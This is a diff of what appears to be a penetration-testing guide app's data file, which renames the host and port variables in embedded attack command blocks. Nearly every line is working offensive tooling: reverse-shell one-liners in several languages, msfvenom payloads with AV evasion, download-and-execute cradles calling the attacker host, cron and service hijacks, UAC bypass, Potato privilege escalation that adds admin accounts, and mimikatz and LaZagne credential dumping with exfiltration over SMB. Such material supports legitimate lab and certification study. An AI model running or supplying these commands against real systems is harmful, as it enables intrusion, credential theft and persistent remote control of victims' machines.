-bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'
+bash+-c+'bash+-i+>%26+/dev/tcp/$lhost/$lport+0>%261'
 
 # Python3
-python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$LHOST",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$lhost",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
 
 # Python2 fallback
-python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$LHOST",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$lhost",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
 
 # PHP (web context)
-php -r '$sock=fsockopen("$LHOST",$LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("$lhost",$lport);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 # Perl
-perl -e 'use Socket;$i="$LHOST";$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
+perl -e 'use Socket;$i="$lhost";$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
 
 # nc with -e (if available)
-nc $LHOST $LPORT -e /bin/bash
+nc $lhost $lport -e /bin/bash
 
 # -- WINDOWS PAYLOADS ---------------------
 # PowerShell one-liner
-powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('$LHOST',$LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sb3=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb3,0,$sb3.Length);$s.Flush()};$c.Close()"
+powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('$lhost',$lport);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sb3=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb3,0,$sb3.Length);$s.Flush()};$c.Close()"
 
 # PowerShell encoded (bypass execution policy + logging)
-# Generate: echo "IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/shell.ps1')" | iconv -t UTF-16LE | base64 -w0
+# Generate: echo "IEX(New-Object Net.WebClient).DownloadString('http://$lhost/shell.ps1')" | iconv -t UTF-16LE | base64 -w0
 powershell -nop -w hidden -enc [BASE64]
 
 # msfvenom Windows stageless exe
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o shell.exe
 # Staged (smaller, needs handler)
-msfvenom -p windows/x64/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o staged.exe
+msfvenom -p windows/x64/shell/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o staged.exe
 
 # msfvenom Linux ELF
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell.elf
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f elf -o shell.elf
 
 # Reference: https://www.revshells.com`,
     warn: "Shell dies immediately? Check: (1) port reachable from target — try 443/80, (2) AV killing binary — use encoded payload or AMSI bypass, (3) bash not available — try sh or python, (4) /bin/bash path wrong — try /bin/sh.",
@@ -5023,18 +5082,18 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shel
 
 # 1. CAN THE TARGET REACH YOU?
 # On target:
-ping $LHOST -c 1       # ICMP allowed?
-curl http://$LHOST      # HTTP out allowed?
+ping $lhost -c 1       # ICMP allowed?
+curl http://$lhost      # HTTP out allowed?
 # On attacker — watch tcpdump:
 sudo tcpdump -i tun0 icmp
-sudo tcpdump -i tun0 port $LPORT
+sudo tcpdump -i tun0 port $lport
 # No ping = strict egress — try ports 80, 443, 53
 
 # 2. WRONG PORT — FIREWALL FILTERING
 # Retry with common allowed egress ports:
-export LPORT=443   # HTTPS — almost never blocked
-export LPORT=80    # HTTP
-export LPORT=53    # DNS (use for tunnel not reverse shell normally)
+export lport=443   # HTTPS — almost never blocked
+export lport=80    # HTTP
+export lport=53    # DNS (use for tunnel not reverse shell normally)
 nc -nlvp 443
 
 # 3. SHELL BINARY NOT AVAILABLE
@@ -5045,12 +5104,12 @@ which bash sh python python3 perl ruby nc ncat
 # 4. ENCODING ISSUE (web delivery)
 # Spaces and special chars break bash -c in web context
 # Use base64 brace expansion — no spaces, no special chars:
-echo 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1' | base64 -w0
+echo 'bash -i >& /dev/tcp/$lhost/$lport 0>&1' | base64 -w0
 # Take the output (B64) and deliver as:
 bash -c '{echo,B64OUTPUT}|{base64,-d}|{bash,-i}'
 
 # PowerShell must use UTF-16LE encoding (not UTF-8):
-echo 'IEX(New-Object Net.WebClient).DownloadString("http://$LHOST/shell.ps1")' | iconv -t UTF-16LE | base64 -w0
+echo 'IEX(New-Object Net.WebClient).DownloadString("http://$lhost/shell.ps1")' | iconv -t UTF-16LE | base64 -w0
 powershell -nop -w hidden -enc B64OUTPUT
 
 # Quick test — does base64 decode correctly?
@@ -5058,7 +5117,7 @@ echo "B64OUTPUT" | base64 -d  # verify payload before delivery
 
 # 5. AV/AMSI BLOCKING BINARY
 # Switch to: encoded PS, msfvenom with encoding, or manual AMSI bypass
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 \
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 \
   -f exe -e x64/xor_dynamic -i 5 -o shell_enc.exe
 
 # 6. INTERACTIVE SHELL NEEDED (su, ssh)
@@ -5124,22 +5183,22 @@ nc $ip 4444`,
 # -- GENERATE PAYLOAD ---------------------
 # Staged Windows x64
 msfvenom -p windows/x64/meterpreter/reverse_tcp \
-  LHOST=$LHOST LPORT=$LPORT -f exe -o met_staged.exe
+  LHOST=$lhost LPORT=$lport -f exe -o met_staged.exe
 
 # Stageless Windows x64
 msfvenom -p windows/x64/meterpreter_reverse_tcp \
-  LHOST=$LHOST LPORT=$LPORT -f exe -o met_stageless.exe
+  LHOST=$lhost LPORT=$lport -f exe -o met_stageless.exe
 
 # Linux staged
 msfvenom -p linux/x64/meterpreter/reverse_tcp \
-  LHOST=$LHOST LPORT=$LPORT -f elf -o met_linux.elf
+  LHOST=$lhost LPORT=$lport -f elf -o met_linux.elf
 
 # -- HANDLER ------------------------------
 msfconsole -q
 use multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
-set LHOST $LHOST
-set LPORT $LPORT
+set LHOST $lhost
+set LPORT $lport
 set ExitOnSession false
 run -j   # run as job, catches multiple sessions
 
@@ -5180,7 +5239,7 @@ script /dev/null -c bash
 # Attacker:
 socat file:\`tty\`,raw,echo=0 tcp-listen:4444
 # Target:
-socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$LHOST:4444
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$lhost:4444
 
 # ── STEP 2: CTRL+Z TRICK ─────────────────────────────
 # After spawning PTY — background the shell
@@ -5227,7 +5286,7 @@ which bash sh zsh
 
 # ── RLWRAP (for nc shells on Kali — before upgrade) ───
 # On Kali, wrap nc with rlwrap for arrow keys + history
-rlwrap nc -nlvp $LPORT`,
+rlwrap nc -nlvp $lport`,
     warn: "After stty raw -echo if something goes wrong and your terminal is broken — type 'reset' blindly and hit Enter. It will restore your terminal even if you can't see what you're typing.",
     choices: [
       { label: "Linux shell — start privesc", next: "linux_post_exploit" },
@@ -5254,9 +5313,9 @@ id | grep -i "sudo\|admin\|wheel\|docker\|lxd\|disk\|adm\|staff"
 # ── STEP 2: LAUNCH AUTOMATED TOOLS IN BACKGROUND ─────
 # Start these first — they run while you do manual enum
 # LinPEAS
-wget http://$LHOST/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh
+wget http://$lhost/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh
 /tmp/lp.sh | tee /tmp/linpeas_out.txt &
-# or in memory: curl http://$LHOST/linpeas.sh | bash
+# or in memory: curl http://$lhost/linpeas.sh | bash
 
 # unix-privesc-check
 ./unix-privesc-check standard 2>/dev/null | tee /tmp/upc_out.txt &
@@ -5481,24 +5540,24 @@ which gcc g++ python python3 perl ruby 2>/dev/null`,
 # python3 -m http.server 80
 
 # Transfer and run (save output)
-wget http://$LHOST/linpeas.sh -O /tmp/lp.sh
+wget http://$lhost/linpeas.sh -O /tmp/lp.sh
 chmod +x /tmp/lp.sh
 /tmp/lp.sh | tee /tmp/linpeas_out.txt
 
 # Or run in memory (no disk touch)
-curl http://$LHOST/linpeas.sh | bash
+curl http://$lhost/linpeas.sh | bash
 
 # If /tmp is noexec:
-cd /dev/shm && wget http://$LHOST/linpeas.sh -O lp.sh && chmod +x lp.sh && ./lp.sh
+cd /dev/shm && wget http://$lhost/linpeas.sh -O lp.sh && chmod +x lp.sh && ./lp.sh
 
 # Exfil output to Kali
 # impacket-smbserver -smb2support kali . -username user -password pass
 # On target:
-# mount.cifs //$LHOST/kali /mnt -o username=user,password=pass
+# mount.cifs //$lhost/kali /mnt -o username=user,password=pass
 # cp /tmp/linpeas_out.txt /mnt/
 
 # ── LINENUM ───────────────────────────────────────────
-wget http://$LHOST/LinEnum.sh -O /tmp/le.sh
+wget http://$lhost/LinEnum.sh -O /tmp/le.sh
 chmod +x /tmp/le.sh && /tmp/le.sh
 
 # ── UNIX-PRIVESC-CHECK (pre-installed on Kali) ────────
@@ -5511,7 +5570,7 @@ cat /tmp/output.txt | grep -i "WARNING"
 
 # ── PSPY — WATCH PROCESSES WITHOUT ROOT ───────────────
 # Download: github.com/DominicBreuker/pspy
-wget http://$LHOST/pspy64 -O /tmp/pspy64
+wget http://$lhost/pspy64 -O /tmp/pspy64
 chmod +x /tmp/pspy64
 /tmp/pspy64
 # Watch for cron jobs running as root (UID=0)
@@ -5586,9 +5645,9 @@ sudo apt-get changelog apt
 # tcpdump (Module 18.4.2 — may be blocked by AppArmor)
 COMMAND='id'
 TF=$(mktemp)
-echo "$COMMAND" > $TF
-chmod +x $TF
-sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
+echo "$COMMAND" > $tf
+chmod +x $tf
+sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $tf -Z root
 
 # env
 sudo env /bin/bash
@@ -5769,7 +5828,7 @@ grep "CRON" /var/log/syslog | tail -20
 
 # ── PSPY — WATCH WITHOUT ROOT ────────────────────────
 # Download: github.com/DominicBreuker/pspy
-wget http://$LHOST/pspy64 -O /tmp/pspy64
+wget http://$lhost/pspy64 -O /tmp/pspy64
 chmod +x /tmp/pspy64 && /tmp/pspy64
 # Watch for UID=0 processes running scripts
 
@@ -5782,7 +5841,7 @@ cat /home/joe/.scripts/user_backups.sh
 # ── EXPLOIT — APPEND REVERSE SHELL ───────────────────
 # Method 1: reverse shell
 echo "" >> /path/to/script.sh
-echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST 443 >/tmp/f" >> /path/to/script.sh
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost 443 >/tmp/f" >> /path/to/script.sh
 
 # Method 2: add SUID to bash
 echo "chmod +s /bin/bash" >> /path/to/script.sh
@@ -5805,7 +5864,7 @@ nc -nlvp 443
 # * * * * * cleanup.sh
 # Create malicious cleanup.sh in /home/joe:
 echo '#!/bin/bash
-bash -i >& /dev/tcp/$LHOST/443 0>&1' > /home/joe/cleanup.sh
+bash -i >& /dev/tcp/$lhost/443 0>&1' > /home/joe/cleanup.sh
 chmod +x /home/joe/cleanup.sh`,
     warn: "Always use >> to APPEND to the cron script, never > which overwrites it. Overwriting may break the script and alert the admin. Check with cat after appending.",
     choices: [
@@ -6014,7 +6073,7 @@ head exploit.c -n 20
 # ── LINUX-EXPLOIT-SUGGESTER ─────────────────────────
 # Specifically for kernel CVE matching — different from LinPEAS
 # On Kali: wget https://github.com/mzet-/linux-exploit-suggester/raw/master/linux-exploit-suggester.sh
-wget http://$LHOST/les.sh -O /tmp/les.sh
+wget http://$lhost/les.sh -O /tmp/les.sh
 chmod +x /tmp/les.sh && /tmp/les.sh
 # Outputs CVEs ranked by probability with compile instructions
 
@@ -6024,7 +6083,7 @@ chmod +x /tmp/les.sh && /tmp/les.sh
 which pkexec
 ls -la /usr/bin/pkexec   # should have SUID
 # Exploit: github.com/berdav/CVE-2021-4034
-wget http://$LHOST/pwnkit -O /tmp/pw
+wget http://$lhost/pwnkit -O /tmp/pw
 chmod +x /tmp/pw && /tmp/pw`,
     warn: "Kernel exploits can crash the system — always test on a clone first. Match BOTH kernel version AND distro. Mismatched exploit = kernel panic = system down = angry client.",
     choices: [
@@ -6141,16 +6200,16 @@ whoami /groups | findstr "Mandatory Label"
 type lazagne.txt
 
 # PrivescCheck — maps to MITRE, produces HTML report
-(new-object net.webclient).downloadstring("http://$LHOST/PrivescCheck.ps1") | iex
+(new-object net.webclient).downloadstring("http://$lhost/PrivescCheck.ps1") | iex
 Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML
 
 # WinPEAS
-iwr http://$LHOST/winPEASx64.exe -OutFile winpeas.exe
+iwr http://$lhost/winPEASx64.exe -OutFile winpeas.exe
 .\\winpeas.exe > winpeas.txt
 
 # Exfiltrate reports via SMB share
 # On Kali: impacket-smbserver -smb2support kali . -username user -password pass
-net use m: \\\\$LHOST\\\\kali /user:user pass
+net use m: \\\\$lhost\\\\kali /user:user pass
 copy PrivescCheck_* m:\\
 copy winpeas.txt m:\\
 copy lazagne.txt m:\\
@@ -6453,7 +6512,7 @@ Get-ChildItem C:\Windows\System32\inetsrv\appcmd.exe -ErrorAction SilentlyContin
 cp /usr/share/peass/winpeas/winPEASx64.exe .
 python3 -m http.server 80
 # On target:
-iwr http://$LHOST/winPEASx64.exe -OutFile C:\\Windows\\Temp\\wp.exe
+iwr http://$lhost/winPEASx64.exe -OutFile C:\\Windows\\Temp\\wp.exe
 .\\wp.exe
 
 # ── READ OUTPUT ──────────────────────────────────────
@@ -6476,12 +6535,12 @@ iwr http://$LHOST/winPEASx64.exe -OutFile C:\\Windows\\Temp\\wp.exe
 # Always do manual checks even after running winPEAS
 
 # ── POWERUP ──────────────────────────────────────────
-iwr http://$LHOST/PowerUp.ps1 -OutFile C:\\Windows\\Temp\\pu.ps1
+iwr http://$lhost/PowerUp.ps1 -OutFile C:\\Windows\\Temp\\pu.ps1
 . .\\pu.ps1
 Invoke-AllChecks
 
 # ── PRIVESCCHECK ─────────────────────────────────────
-iwr http://$LHOST/PrivescCheck.ps1 -OutFile C:\\Windows\\Temp\\pc.ps1
+iwr http://$lhost/PrivescCheck.ps1 -OutFile C:\\Windows\\Temp\\pc.ps1
 powershell -ep bypass -c ". .\\pc.ps1; Invoke-PrivescCheck"
 powershell -ep bypass -c ". .\\pc.ps1; Invoke-PrivescCheck -Extended"
 
@@ -6491,7 +6550,7 @@ powershell -ep bypass -c ". .\\pc.ps1; Invoke-PrivescCheck -Extended"
 # wget "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe"
 # python3 -m http.server 80
 # On Windows:
-iwr http://$LHOST/Seatbelt.exe -OutFile C:\\Windows\\Temp\\sb.exe
+iwr http://$lhost/Seatbelt.exe -OutFile C:\\Windows\\Temp\\sb.exe
 Unblock-File C:\\Windows\\Temp\\sb.exe
 C:\\Windows\\Temp\\sb.exe -group=all
 C:\\Windows\\Temp\\sb.exe InstalledProducts
@@ -6500,20 +6559,20 @@ C:\\Windows\\Temp\\sb.exe -group=system -outputfile C:\\Windows\\Temp\\seatbelt.
 # ── JAWS ──────────────────────────────────────────────
 # Download:
 # wget "https://github.com/411Hall/JAWS/raw/master/jaws-enum.ps1"
-iwr http://$LHOST/jaws-enum.ps1 -OutFile C:\\Windows\\Temp\\jaws.ps1
+iwr http://$lhost/jaws-enum.ps1 -OutFile C:\\Windows\\Temp\\jaws.ps1
 powershell -ep bypass -c ". C:\\Windows\\Temp\\jaws.ps1" | Tee-Object -FilePath C:\\Windows\\Temp\\jaws.txt
 
 # ── LAZAGNE — credential dumper ────────────────────────
 # Dumps creds from browsers, git, wifi, windows vault etc
 # wget https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe
-iwr http://$LHOST/LaZagne.exe -OutFile C:\\Windows\\Temp\\lz.exe
+iwr http://$lhost/LaZagne.exe -OutFile C:\\Windows\\Temp\\lz.exe
 Unblock-File C:\\Windows\\Temp\\lz.exe
 .\\lz.exe all > C:\\Windows\\Temp\\lazagne.txt
 type C:\\Windows\\Temp\\lazagne.txt
 
 # ── PRIVESCCHECK EXTENDED (HackTrack method) ───────────
 # In-memory — no file drop needed:
-(new-object net.webclient).downloadstring("http://$LHOST/PrivescCheck.ps1") | iex
+(new-object net.webclient).downloadstring("http://$lhost/PrivescCheck.ps1") | iex
 Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML
 
 # ── LOCALACCOUNTTOKENFILTERPOLICY ──────────────────────
@@ -6604,7 +6663,7 @@ sekurlsa::logonpasswords
 # wget https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip
 
 # ── SIGMAPOTATO (Module 17.3.2) ──────────────────────
-iwr http://$LHOST/SigmaPotato.exe -OutFile C:\\Windows\\Temp\\sp.exe
+iwr http://$lhost/SigmaPotato.exe -OutFile C:\\Windows\\Temp\\sp.exe
 Unblock-File C:\\Windows\\Temp\\sp.exe
 .\\sp.exe "net user hacker pass123! /add"
 .\\sp.exe "net localgroup Administrators hacker /add"
@@ -6612,27 +6671,27 @@ Unblock-File C:\\Windows\\Temp\\sp.exe
 .\\sp.exe "C:\\Windows\\Temp\\shell.exe"
 
 # ── GODPOTATO (most universal) ───────────────────────
-iwr http://$LHOST/GodPotato-NET4.exe -OutFile C:\\Windows\\Temp\\gp.exe
+iwr http://$lhost/GodPotato-NET4.exe -OutFile C:\\Windows\\Temp\\gp.exe
 Unblock-File C:\\Windows\\Temp\\gp.exe
 .\\gp.exe -cmd "cmd /c whoami"
 .\\gp.exe -cmd "net user hacker pass123! /add"
 .\\gp.exe -cmd "C:\\Windows\\Temp\\shell.exe"
 
 # ── PRINTSPOOFER (Win10 / Server 2016-2019) ──────────
-iwr http://$LHOST/PrintSpoofer64.exe -OutFile C:\\Windows\\Temp\\pf.exe
+iwr http://$lhost/PrintSpoofer64.exe -OutFile C:\\Windows\\Temp\\pf.exe
 Unblock-File C:\\Windows\\Temp\\pf.exe
 .\\pf.exe -i -c cmd
 .\\pf.exe -c "C:\\Windows\\Temp\\shell.exe"
 
 # ── ROGUEPOTATO (Win10 1809+ / Server 2019+) ─────────
 # On Kali first:
-# socat tcp-listen:135,reuseaddr,fork tcp:$LHOST:9999
-iwr http://$LHOST/RoguePotato.exe -OutFile C:\\Windows\\Temp\\rp.exe
+# socat tcp-listen:135,reuseaddr,fork tcp:$lhost:9999
+iwr http://$lhost/RoguePotato.exe -OutFile C:\\Windows\\Temp\\rp.exe
 Unblock-File C:\\Windows\\Temp\\rp.exe
-.\\rp.exe -r $LHOST -e "cmd.exe" -l 9999
+.\\rp.exe -r $lhost -e "cmd.exe" -l 9999
 
 # ── JUICYPOTATONG (fallback) ─────────────────────────
-iwr http://$LHOST/JuicyPotatoNG.exe -OutFile C:\\Windows\\Temp\\jp.exe
+iwr http://$lhost/JuicyPotatoNG.exe -OutFile C:\\Windows\\Temp\\jp.exe
 Unblock-File C:\\Windows\\Temp\\jp.exe
 .\\jp.exe -t * -p "C:\\Windows\\System32\\cmd.exe" -a "/c whoami"`,
     warn: null,
@@ -6660,10 +6719,10 @@ sc qc <ServiceName>
 
 # Generate payload (no MSF console needed — msfvenom is standalone)
 msfvenom -p windows/x64/shell_reverse_tcp \\
-  LHOST=$LHOST LPORT=$LPORT -f exe -o Program.exe
+  LHOST=$lhost LPORT=$lport -f exe -o Program.exe
 
 # Transfer payload to writable location
-# Start listener: nc -nlvp $LPORT
+# Start listener: nc -nlvp $lport
 sc stop <ServiceName>
 sc start <ServiceName>`,
     warn: null,
@@ -6737,7 +6796,7 @@ reg save HKLM\\system system
 # On Kali:
 impacket-smbserver -smb2support kali . -username user -password pass
 # On Windows:
-net use Z: \\\\$LHOST\\\\kali /user:user pass
+net use Z: \\\\$lhost\\\\kali /user:user pass
 copy sam z:
 copy system z:
 
@@ -6788,7 +6847,7 @@ echo "net user hacker pass123! /add" >> C:\\\\scripts\\\\cleanup.ps1
 echo "net localgroup administrators hacker /add" >> C:\\\\scripts\\\\cleanup.ps1
 
 # Or replace entirely with reverse shell
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f exe -o task_payload.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f exe -o task_payload.exe
 # Transfer and place where the task expects it
 
 # ── TRIGGER MANUALLY IF POSSIBLE ────────────────────
@@ -6820,10 +6879,10 @@ Get-RegistryAlwaysInstallElevated
 
 # ── EXPLOIT ──────────────────────────────────────────
 # Create malicious MSI on Kali
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f msi -o evil.msi
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f msi -o evil.msi
 
 # Transfer to target
-iwr http://$LHOST/evil.msi -OutFile C:\\\\Windows\\\\Temp\\\\evil.msi
+iwr http://$lhost/evil.msi -OutFile C:\\\\Windows\\\\Temp\\\\evil.msi
 
 # Set up listener on Kali
 nc -nlvp 443
@@ -6925,24 +6984,24 @@ sc stop Updater && sc delete Updater`,
     body: "Use Windows built-in binaries to avoid dropping tools. Useful for AV evasion and restricted environments. Reference: lolbas-project.github.io",
     cmd: `# ── FILE TRANSFER ────────────────────────────────────
 # certutil — download file
-certutil -urlcache -split -f http://$LHOST/shell.exe C:\\Windows\\Temp\\shell.exe
+certutil -urlcache -split -f http://$lhost/shell.exe C:\\Windows\\Temp\\shell.exe
 
 # bitsadmin
-bitsadmin /transfer job http://$LHOST/shell.exe C:\\Windows\\Temp\\shell.exe
+bitsadmin /transfer job http://$lhost/shell.exe C:\\Windows\\Temp\\shell.exe
 
 # powershell
-(New-Object Net.WebClient).DownloadFile("http://$LHOST/shell.exe","C:\\Windows\\Temp\\shell.exe")
-iwr http://$LHOST/shell.exe -OutFile C:\\Windows\\Temp\\shell.exe
+(New-Object Net.WebClient).DownloadFile("http://$lhost/shell.exe","C:\\Windows\\Temp\\shell.exe")
+iwr http://$lhost/shell.exe -OutFile C:\\Windows\\Temp\\shell.exe
 
 # ── CODE EXECUTION ────────────────────────────────────
 # rundll32
 rundll32 shell32.dll,ShellExec_RunDLL C:\\Windows\\Temp\\shell.exe
 
 # regsvr32 (AppLocker bypass)
-regsvr32 /s /n /u /i:http://$LHOST/shell.sct scrobj.dll
+regsvr32 /s /n /u /i:http://$lhost/shell.sct scrobj.dll
 
 # mshta
-mshta http://$LHOST/shell.hta
+mshta http://$lhost/shell.hta
 
 # wmic
 wmic process call create "C:\\Windows\\Temp\\shell.exe"
@@ -7047,14 +7106,14 @@ Get-ModifiableServiceFile
 # }
 x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
 # Or reverse shell:
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f exe -o shell.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f exe -o shell.exe
 
 # ── STEP 4: REPLACE THE BINARY ────────────────────────
 # Backup original first!
 move C:\\\\xampp\\\\mysql\\\\bin\\\\mysqld.exe C:\\\\Users\\\\dave\\\\mysqld.exe.bak
 
 # Transfer and place
-iwr http://$LHOST/adduser.exe -OutFile adduser.exe
+iwr http://$lhost/adduser.exe -OutFile adduser.exe
 move .\\adduser.exe C:\\\\xampp\\\\mysql\\\\bin\\\\mysqld.exe
 
 # ── STEP 5: RESTART SERVICE ───────────────────────────
@@ -7125,19 +7184,19 @@ i686-w64-mingw32-gcc adduser.c -o adduser32.exe
 x86_64-w64-mingw32-gcc adduser.cpp --shared -o TextShaping.dll
 
 # ── REVERSE SHELL EXE ────────────────────────────────
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f exe -o shell.exe
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f exe -e x86/shikata_ga_nai -o shell_enc.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f exe -o shell.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f exe -e x86/shikata_ga_nai -o shell_enc.exe
 
 # ── REVERSE SHELL DLL ────────────────────────────────
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f dll -o shell.dll
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f dll -o shell.dll
 
 # ── MSI (AlwaysInstallElevated) ──────────────────────
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f msi -o evil.msi
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f msi -o evil.msi
 
 # ── SERVE AND TRANSFER ───────────────────────────────
 python3 -m http.server 80
 # On Windows:
-iwr http://$LHOST/adduser.exe -OutFile C:\\Windows\\Temp\\adduser.exe
+iwr http://$lhost/adduser.exe -OutFile C:\\Windows\\Temp\\adduser.exe
 Unblock-File C:\\Windows\\Temp\\adduser.exe
 
 # ── USE CASES ────────────────────────────────────────
@@ -7204,11 +7263,11 @@ icacls "C:\Program Files\VulnApp\"
 x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
 
 # Or msfvenom:
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f dll -o TextShaping.dll
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f dll -o TextShaping.dll
 
 # ── STEP 4: PLANT THE DLL ─────────────────────────────
 # Transfer and place in application directory
-iwr http://$LHOST/TextShaping.dll -OutFile "C:\FileZilla\FileZilla FTP Client\TextShaping.dll"
+iwr http://$lhost/TextShaping.dll -OutFile "C:\FileZilla\FileZilla FTP Client\TextShaping.dll"
 
 # ── STEP 5: TRIGGER ───────────────────────────────────
 # Option A: Restart the service
@@ -7274,11 +7333,11 @@ Start-Process "C:\Windows\System32\eventvwr.exe"
 # -- METHOD 4: ISCSICPL.EXE (reliable, Win 10/11) -----
 # iscsicpl.exe is auto-elevated — hijack via PATH
 # Step 1: create payload on Kali
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f exe -o iscsicpl.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f exe -o iscsicpl.exe
 
 # Step 2: create writable dir, drop fake binary
 mkdir C:\\Windows\\Temp\\uac
-iwr http://$LHOST/iscsicpl.exe -OutFile C:\\Windows\\Temp\\uac\\iscsicpl.exe
+iwr http://$lhost/iscsicpl.exe -OutFile C:\\Windows\\Temp\\uac\\iscsicpl.exe
 Unblock-File C:\\Windows\\Temp\\uac\\iscsicpl.exe
 
 # Step 3: prepend dir to PATH for this session
@@ -7305,7 +7364,7 @@ Start-Process iscsicpl
 .\\Akagi64.exe 61 C:\\Windows\\Temp\\shell.exe
 
 # -- LISTENER -----------------------------
-nc -nlvp $LPORT`,
+nc -nlvp $lport`,
     warn: "If whoami /groups shows you are NOT in the Administrators group — UAC bypass won't help. You need actual privilege escalation first, not just integrity elevation. These are different problems.",
     choices: [
       { label: "High integrity shell achieved", next: "got_root_windows" },
@@ -7330,7 +7389,7 @@ reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system
 impacket-secretsdump -sam sam -system system local
 
 # Mimikatz — plaintext creds from LSASS
-iwr http://$LHOST/mimikatz.exe -OutFile C:\\Windows\\Temp\\m.exe
+iwr http://$lhost/mimikatz.exe -OutFile C:\\Windows\\Temp\\m.exe
 .\\m.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
 
 # Spray dumped hashes laterally
@@ -7406,7 +7465,7 @@ bloodhound-python -u user -p 'pass' \\
   -d domain.com -ns $ip -c All
 
 # Or SharpHound from Windows target
-iwr http://$LHOST/SharpHound.exe -OutFile C:\\Windows\\Temp\\sh.exe
+iwr http://$lhost/SharpHound.exe -OutFile C:\\Windows\\Temp\\sh.exe
